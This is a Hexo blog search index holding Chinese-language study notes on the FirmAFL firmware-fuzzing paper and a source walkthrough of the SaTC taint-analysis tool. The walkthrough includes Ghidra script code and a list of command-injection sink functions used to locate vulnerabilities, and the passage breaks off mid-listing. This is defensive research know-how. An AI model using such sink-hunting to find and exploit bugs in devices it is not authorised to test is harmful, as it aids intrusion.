<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FirmAFL</title>
      <link href="/2023/09/13/FirmAFL/"/>
      <url>/2023/09/13/FirmAFL/</url>
      
        <content type="html"><![CDATA[<p>这几天阅读了一篇关于怎样用AFL对路由器设备进行fuzzing的文章<a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FirmAFL</a>记录一下这篇文章比较有意思的地方。</p><p>论文地址:<a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">https://www.usenix.org/conference/usenixsecurity19/presentation/zheng</a><br>代码仓库:<a href="https://github.com/zyw-200/FirmAFL">https://github.com/zyw-200/FirmAFL</a></p><span id="more"></span><h2 id="以往工作的问题"><a href="#以往工作的问题" class="headerlink" title="以往工作的问题"></a>以往工作的问题</h2><p>在固件动态分析中，存在一些常见问题，例如</p><ol><li>对于外设的模拟较难。外设例如天线设备，传感器设备等。大部分iot设备都存在对这类外设的读取，写入，而fuzzing过程中由于无法真正购买这些外设并进行fuzz(也有人试过这么做，论文是IoTFuzzer，结果是Fuzzing效率特别低)，因此较难将固件真正运行起来，进行动态测试。目前常见的模拟方式是<code>firmadyne</code>和<code>firmAE</code>。后者效果应该优于前者。</li><li>模糊测试中需要大量fork，产生新进程用于同时fuzzing多种payload。但是基于qemu的模拟fork过程中的系统调用开销非常大，也会提升fuzzing的开销。</li><li>现有的针对iot的模糊测试系统对比如下，目前的code coverage效果都不太理想，而AFL并不能直接用在iot设备上(会出现问题2)</li></ol><p><img src="/2023/09/13/FirmAFL/image-20230913164529783.png" alt="image-20230913164529783"></p><p>本文提出的<code>augmented process emulation</code>方案解决了上述两个问题。</p><h2 id="augmented-process-emulation"><a href="#augmented-process-emulation" class="headerlink" title="augmented process emulation"></a>augmented process emulation</h2><p>现在常见的基于多种架构的模拟器框架是qemu。作者注意到，qemu中存在两种mode，system mode和user mode。他们分别用于系统层和用户层代码的运行。两者的执行效率也不同，具体而言有如下不同。</p><ol><li>system mode对于每次地址访问的翻译需要经过MMU，内部需要经过GVA(guest virtual address)、HVA(Host Virtual Address)等地址翻译过程。然而user mode中只需要对HVA加上一段偏移即可。这导致user mode中指令执行速度相比system mode快很多</li><li>qemu并不是每碰到一句指令就翻译成host OS的指令，而是以basic block为单位翻译的(因为这个特性，我们可以在翻译过程中对指令进行插桩，从而实现将black box fuzzing转换为grey-box)。在user mode中可以一次性对多个物理页的指令进行翻译，而system mode中一次只能对同一个page的指令翻译。因为多次调用翻译会导致效率降低，所以user mode的指令执行速度将会快于system mode</li><li>user mode的系统调用是直接使用host kernel和硬件进行回应，而system mode则在模拟的硬件和模拟的OS进行回应。后者速度会慢很多</li></ol><p>作者发现，由于之前的固件模拟共工作通常使用full-system emulation。导致所有代码都在system-mode下执行，这将导致效率非常地下。因此作者提出一种策略将大部分代码执行限制在HOST OS kernel中，只有当进行系统调用或者缺页中断时才切换到qemu根据固件模拟的kernel。这样可以从两个方面减少运行时开销</p><ol><li>指令翻译的吞吐量</li><li>地址访问时page fault处理的速度。</li></ol><p>下面时作者的构想图，其中RAMfile是system mode和user mode共享内存的映射表。(当然程序在启动时肯定在full-system mode，只有在到大特定位置，例如开始接受网络数据包之后，才会切换到user mode以加快速度。)</p><p><img src="/2023/09/13/FirmAFL/image-20230913182646187.png" alt="image-20230913182646187"></p><h2 id="具体做法"><a href="#具体做法" class="headerlink" title="具体做法"></a>具体做法</h2><p>怎样具体实现呢?作者因此提出了论文题目中的<strong>augmented process emulation</strong>模拟策略。实现这个策略有两个先决条件</p><ol><li>固件可以被一个基于系统的模拟器很好的模拟(基于firmadyne已经可以实现)</li><li>固件在一个支持多线程的OS上(目前接近50%的路由器是基于Linux架构的)</li></ol><p>作者的实验目标是</p><ol><li><strong>透明性</strong>：即模拟在user mode的固件似乎是被模拟在系统层面上</li><li><strong>高效性</strong>：在模拟的user mode程序中，fuzzing的效率应接近用户层的原生程序</li></ol><p>然而，会碰到几个问题</p><ol><li>内存映射。即在user mode中的AFL，无法直接在fork时访问system mode层面的地址空间。这一部分需要修改qemu以配合afl完成fork时的内存映射。</li><li>error page handling：当用户层发生缺页故障时，按照qemu的设计应该被递交给host OS来处理，但是此时需要被模拟的OS来进行处理。需要hook一些地址返回代码来完成这样的请求。解决这一难题的难点时判断何时内核的page mapping已经完成，因为内核在处理缺页时经常是多线程的状态。</li><li>避免内核的COW机制。在fork的时候，内核经常会为了节省开销而使用copy on write机制。如果在fuzzing过程中使用COW，将会导致大量page fault。在非host OS中处理这些请求时非常耗时的。</li><li>系统调用重定向。在user mode中完成一系列系统调用需要guest OS而不是user mode进行处理。需要在qemu添加重定向过程。</li><li>优化和文件系统相关的系统调用。这一部分应该是作者尝试出来的。因为每个固件中都有对应的文件系统，而一般情况下对文件系统读写需要走系统调用，这样开销会比较大。作者通过将这种读取写入直接写入到host OS目录下的固件文件系统中，从而绕开了guest OS读写的开销</li></ol><p>为了达到这一目的，作者在系统的几个方面做了修改</p><ol><li>启动时，使用system mode，这里借助firmadyne的模拟工作以及DECAF来判断何时进入到可以fork的阶段</li><li>fork时，不是选择AFL默认的entry point，而是选择接收到网络信息的时刻。此时也需要复制一份DECAF的VMI，但是这样复制一份的开销也比较大。作者提出了一种轻量级的复制VMI的策略，因为在host OS中处理缺页中断是比较快的，因此可以在复制这里的VMI中使用COW，从而只需要保存一份核心的VMP snapshot即可，其余部分用COW来修改。</li><li>创建输入。由于AFL一般输入是命令行，需要将其改为接受网络消息的时刻，可以通过在user-mode的模拟中进行插桩，从而不用将其重定向到system mode，而是直接接受来自AFL的输入并继续处理，测试其用户层面的代码</li><li>收集反馈信息。可以直接通过QEMU翻译过程中对分支语句进行插装，获取反馈率。这一部分和AFL在qemu user mode中的插装是类似的。</li></ol><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>回到刚才作者的实验目的，接下来测试两点</p><ol><li>在augmented mode和纯user mode下模拟的在效率差距为多少(对应table4)</li><li>user mode下的syscall redirection 会为模拟增加多少开销(对应table5)</li></ol><h3 id><a href="#" class="headerlink" title></a><img src="/2023/09/13/FirmAFL/image-20230916121832782.png" alt="image-20230916121832782"></h3><p>此外，作者还调研了在每次fuzzing过程中各个部分的耗时情况，如下所示。可以看到augmentated emulation提升最大的地方在于将code translation基本减少到0，这是由于使用user mode可以将指令翻译不局限在同一个物理页面上。此外，还有user execution time的大量减少，这主要是因为减少了大量的地址翻译时间(避免system mode中的地址翻译)</p><p><img src="/2023/09/13/FirmAFL/image-20230916132829808.png" alt="image-20230916132829808"></p><p>作者还调研了syscall redirection的作用。可以看到大量的sys exec time明显下降了，这是因为host OS帮助guest OS执行了大量代码，例如文件系统读写等。</p><p><img src="/2023/09/13/FirmAFL/image-20230916133439180.png" alt="image-20230916133439180"></p><p>最后，作者比较了fuzzing过程中full system emulation和augmented emulation的速度，可以发现大部分都提升了4~10倍。</p><p><img src="/2023/09/13/FirmAFL/image-20230916134513281.png" alt="image-20230916134513281"></p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>satc_source</title>
      <link href="/2023/08/18/satc-source/"/>
      <url>/2023/08/18/satc-source/</url>
      
        <content type="html"><![CDATA[<p>阅读并调试satc工具的代码，看看能不能做一些改进！</p><span id="more"></span><p>测试输入，注意在satc的docker中设置vscode的python版本是2021年发布的，不然会无法调试python2。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//launch.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    </span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Python: Current File&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-d&quot;</span><span class="punctuation">,</span> <span class="string">&quot;/dataset/_RAXE500-V1.0.12.96_2.0.45.chk.extracted&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span> <span class="string">&quot;./out2.txt&quot;</span><span class="punctuation">,</span> <span class="string">&quot;--ghidra_script=ref2sink_cmdi&quot;</span><span class="punctuation">,</span> <span class="string">&quot;--ghidra_script=ref2sink_bof&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-b&quot;</span><span class="punctuation">,</span> <span class="string">&quot;httpd&quot;</span><span class="punctuation">,</span> <span class="string">&quot;--taint_check&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integratedTerminal&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;justMyCode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;PYTHONPATH&quot;</span><span class="punctuation">:</span><span class="string">&quot;/home/satc/.virtualenvs/SaTC/lib/python2.7/site-packages/&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>在satc.py入口，程序解析输入参数。一共有四种脚本用来对binary进行测试</p><ul><li>ref2share</li><li>share2sink</li></ul><p>以上两个脚本用于测试跨binary的信息传递中是否存在漏洞</p><ul><li>ref2sink_cmdi</li><li>ref2sink_bof</li></ul><p>以上两个脚本测试单个binary中是否存在cmdi或者bof漏洞</p><h2 id="front-analysis"><a href="#front-analysis" class="headerlink" title="front analysis"></a>front analysis</h2><p>入口之后进入前端解析。这一部分主要做以下事情</p><ol><li>扫描固件中所有前端文件，包含五个内容asp,html,js,php,xml。根据文件格式并用正则表达式提取关键字或者提取函数如下所示为输出</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2023-08-18 05:54:20,292-root-logger.py-[line:112]-INFO : Find Keyword : allowedValueList PATH: /dataset/_RAXE500-V1.0.12.96_2.0.45.chk.extracted/squashfs-root/www/Public_UPNP_WANEtherLinkCfg.xml</span><br><span class="line">2023-08-18 05:54:20,293-root-logger.py-[line:112]-INFO : Find Keyword : allowedValue PATH: /dataset/_RAXE500-V1.0.12.96_2.0.45.chk.extracted/squashfs-root/www/Public_UPNP_WANEtherLinkCfg.xml</span><br><span class="line">2023-08-18 05:54:20,293-root-logger.py-[line:112]-INFO : Find Keyword : allowedValue PATH: /dataset/_RAXE500-V1.0.12.96_2.0.45.chk.extracted/squashfs-root/www/Public_UPNP_WANEtherLinkCfg.xml</span><br></pre></td></tr></table></figure><p>具体而言提取的方式是正则匹配，下面是html的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_keyword</span>(<span class="params">self, html</span>):</span><br><span class="line">    html_content = html.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    name_list = re.findall(<span class="string">r&#x27;name=&quot;(.*?)&quot;&#x27;</span>, html_content)</span><br><span class="line">    id_list = re.findall(<span class="string">r&#x27;id=&quot;(.*?)&quot;&#x27;</span>, html_content)</span><br><span class="line">    results = <span class="built_in">set</span>(name_list) | <span class="built_in">set</span>(id_list)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> results:</span><br><span class="line">        self._get_keyword(res, check=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_function</span>(<span class="params">self, html</span>):</span><br><span class="line">    html_content = html.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    path_list = re.findall(<span class="string">r&#x27;action=&quot;(.*?)&quot;&#x27;</span>, html_content)</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> path_list:</span><br><span class="line">        self._get_function(path, check=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_js_src</span>(<span class="params">self, html</span>):</span><br><span class="line">    html_content = html.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    src_list = re.findall(<span class="string">r&#x27;&lt;script src=&quot;(.*?)&quot;&gt;&lt;/script&gt;&#x27;</span>, html_content)</span><br><span class="line">    <span class="keyword">for</span> src <span class="keyword">in</span> src_list:</span><br><span class="line">        res = src.find(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> res &gt; <span class="number">0</span>:</span><br><span class="line">            src = src[:res]</span><br><span class="line">        src_file = src.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">        js_obj = self.jsfile_citations.get(src_file, JSFile(src))</span><br><span class="line">        js_obj.add_depend(self.fpath)</span><br><span class="line">        self.jsfile_citations.update(&#123;src_file: js_obj&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这之后，将提取到的keyword和function保存在<code>self.analysise_obj</code>中。这里的function也包含了POST到具体哪个cgi的cgi名称</p><ol start="2"><li>在<code>get_analysise_result</code>中将上述信息提取，筛选掉keyword在不同文件中出现次数超过一定数量的文件，将他们记作removed，也许是为了效率的考量。其实这里是可能存在一些问题的，不知道为什么remove了</li></ol><p><img src="/2023/08/18/satc-source/image-20230818142111007.png" alt="image-20230818142111007"></p><p>remove部分代码如下，这里的<code>PARA_MAX_FRONT</code>默认为10</p><p><img src="/2023/08/18/satc-source/image-20230818143812334.png" alt="image-20230818143812334"></p><ol start="3"><li>进入backanalysis阶段，检查指定的binary(或者是整个固件)中引用的js文件。并用strings提取出二进制中的字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">self</span>):</span><br><span class="line">    res = execute(<span class="string">&quot;strings &#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(self.binaryfile))</span><br><span class="line">    self.bin_strings = <span class="built_in">set</span>(res.split(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    b_total.add(<span class="built_in">len</span>(self.bin_strings))</span><br><span class="line">    <span class="keyword">return</span> self.bin_strings</span><br></pre></td></tr></table></figure><p>之后根据之前提取到的所有前端文件中的函数、关键字信息，在指定二进制文件中寻找是否存在对应字符串、函数名等信息.将(有意义函数名、有意义字符串)一起作为一个元组，append在<code>elf_result</code>之后。</p><p>之后将结果记录下，并且组合上获取到keyword或者function name的源文件名称是什么。将上述获取到的内容作为结果保存。</p><h2 id="ghidra-analysis"><a href="#ghidra-analysis" class="headerlink" title="ghidra analysis"></a>ghidra analysis</h2><p>在ghidra analysis中，引用了本地指定的ghidra脚本。这里我选择ref2sink_cmdi和ref2sink_bof做分析。从结果上来看ghidra是用来根据key word生成什么函数包含了这个keyword，以及这个函数的调用链是什么，以及启发式的搜索到指定函数位置附近的可能可以接受参数的函数。先来看输出结果</p><p><img src="/2023/08/18/satc-source/image-20230818152539744.png" alt="image-20230818152539744"></p><h3 id="ref2sink-cmdi"><a href="#ref2sink-cmdi" class="headerlink" title="ref2sink_cmdi"></a>ref2sink_cmdi</h3><p>以下函数是数据流追踪的核心内容，当给定<code>target</code>之后(这个target是一个字符串)，找到这个target在程序位置，再根据此位置找到包含此字符串的函数。之后在<code>findSinkPath</code>中找到此函数如何到达目标sink函数的路径，代码中用的是dfs方法，这是比较耗时的。而如果找不到单层的包含此地址的函数，就再进行一层寻找，也就是用到这一条指令的再上面一层函数。这样的原因可能是因为有一些地址不被解析在函数中(我也不清楚)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">searchParam</span>(<span class="params">target, refstart=<span class="literal">None</span>, refend=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;start searching &quot;%s&quot; ...&#x27;</span> % target</span><br><span class="line">    curAddr = currentProgram.minAddress</span><br><span class="line">    end = currentProgram.maxAddress</span><br><span class="line">    haveWayToSink = <span class="literal">False</span></span><br><span class="line">    checkedRefAddr = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> curAddr &lt; end:</span><br><span class="line">        curAddr = find(curAddr, target)</span><br><span class="line">        <span class="keyword">if</span> curAddr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> getByte(curAddr.add(<span class="built_in">len</span>(target))) != <span class="number">0</span>:</span><br><span class="line">            curAddr = curAddr.add(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> ref <span class="keyword">in</span> getReferencesTo(curAddr):</span><br><span class="line">            <span class="keyword">if</span> refstart <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> refstart &gt; ref.fromAddress:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> refend <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> refend &lt; ref.fromAddress:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> target <span class="keyword">not</span> <span class="keyword">in</span> newParam:</span><br><span class="line">                referenced.add(target)</span><br><span class="line">            caller = getFunctionContaining(ref.fromAddress)</span><br><span class="line">            <span class="keyword">if</span> caller <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> DEBUG:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;Reference From&#x27;</span>, a2h(ref.fromAddress), <span class="string">&#x27;(%s)&#x27;</span> % caller,</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;To&#x27;</span>, a2h(curAddr), <span class="string">&#x27;(&quot;%s&quot;)&#x27;</span> % target</span><br><span class="line">                <span class="keyword">if</span> ref.fromAddress <span class="keyword">in</span> checkedRefAddr:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                haveWayToSink = findSinkPath(ref.fromAddress, curAddr, target) <span class="keyword">or</span> haveWayToSink</span><br><span class="line">                checkedRefAddr.add(ref.fromAddress)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> ref2 <span class="keyword">in</span> getReferencesTo(ref.fromAddress):</span><br><span class="line">                    caller = getFunctionContaining(ref2.fromAddress)</span><br><span class="line">                    <span class="keyword">if</span> caller <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> DEBUG:</span><br><span class="line">                            <span class="built_in">print</span> <span class="string">&#x27;Ignore&#x27;</span>, getSymbolAt(ref2.fromAddress), <span class="string">&#x27;at&#x27;</span>, a2h(ref2.fromAddress)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> DEBUG:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&#x27;Reference From&#x27;</span>, a2h(ref2.fromAddress), <span class="string">&#x27;(%s)&#x27;</span> % caller,</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&#x27;To&#x27;</span>, a2h(ref.fromAddress), <span class="string">&#x27;(%s)&#x27;</span> % getSymbolAt(ref.fromAddress),</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&#x27;To&#x27;</span>, a2h(curAddr), <span class="string">&#x27;(&quot;%s&quot;)&#x27;</span> % target</span><br><span class="line">                    <span class="keyword">if</span> ref2.fromAddress <span class="keyword">in</span> checkedRefAddr:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    haveWayToSink = findSinkPath(ref2.fromAddress, curAddr, target) <span class="keyword">or</span> haveWayToSink</span><br><span class="line">                    checkedRefAddr.add(ref2.fromAddress)</span><br><span class="line"></span><br><span class="line">        curAddr = curAddr.add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;finish searching &quot;%s&quot;&#x27;</span> % target</span><br><span class="line">    <span class="keyword">return</span> haveWayToSink</span><br></pre></td></tr></table></figure><p>findSinkPath中，首先调用<code>search</code>寻找所有被call的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    startFunc = getFunctionContaining(refaddr)</span><br><span class="line">    <span class="keyword">assert</span> startFunc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    pending.append(startFunc)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(pending):</span><br><span class="line">        search(pending.pop())</span><br><span class="line"></span><br><span class="line">    vulnerable = dfs(startFunc, [], refaddr)</span><br><span class="line">    <span class="keyword">if</span> vulnerable:</span><br><span class="line">        searchStrArg(startFunc)</span><br><span class="line">    <span class="keyword">return</span> vulnerable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是search函数,将此函数中每一个callee放入list中。直到没有call函数为止</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">func, start=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> func <span class="keyword">in</span> callMap:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        callMap[func] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        start = start <span class="keyword">or</span> func.entryPoint</span><br><span class="line">        end = func.body.maxAddress</span><br><span class="line"></span><br><span class="line">        inst = getInstructionAt(start)</span><br><span class="line">        <span class="keyword">while</span> inst <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> inst.address &lt; end:</span><br><span class="line">            callee = getCallee(inst)</span><br><span class="line">            <span class="keyword">if</span> callee <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                callMap[func][inst.address] = callee</span><br><span class="line">                <span class="keyword">if</span> callee <span class="keyword">not</span> <span class="keyword">in</span> callMap:</span><br><span class="line">                    pending.append(callee)</span><br><span class="line">            inst = inst.<span class="built_in">next</span>    </span><br></pre></td></tr></table></figure><p>之后调用dfs,它从refaddr(有字符串的位置)开始搜索，直到调用的函数中存在sink，也就是system类的函数，否则检查callee是否是<code>needCheckConstantStr</code>的一员，这里检查了字符串是否可能被拼接以及是否是常量字符串。</p><p>在cmdi检测中,needCheckFormat中的sprintf并没有出现在sink中，也没有出现在bof检测中。这是它的一个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sinks = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;___system&#x27;</span>, <span class="string">&#x27;bstar_system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;doSystemCmd&#x27;</span>, <span class="string">&#x27;doShell&#x27;</span>, <span class="string">&#x27;twsystem&#x27;</span>, <span class="string">&#x27;CsteSystem&#x27;</span>, <span class="string">&#x27;cgi_deal_popen&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;ExeCmd&#x27;</span>, <span class="string">&#x27;ExecShell&#x27;</span>, <span class="string">&#x27;exec_shell_popen&#x27;</span>, <span class="string">&#x27;exec_shell_popen_str&#x27;</span></span><br><span class="line">         ]</span><br><span class="line">needCheckConstantStr = &#123;</span><br><span class="line">    <span class="string">&#x27;system&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;fwrite&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;___system&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;bstar_system&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;popen&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;execve&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;strcpy&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;strcat&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;strncpy&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span 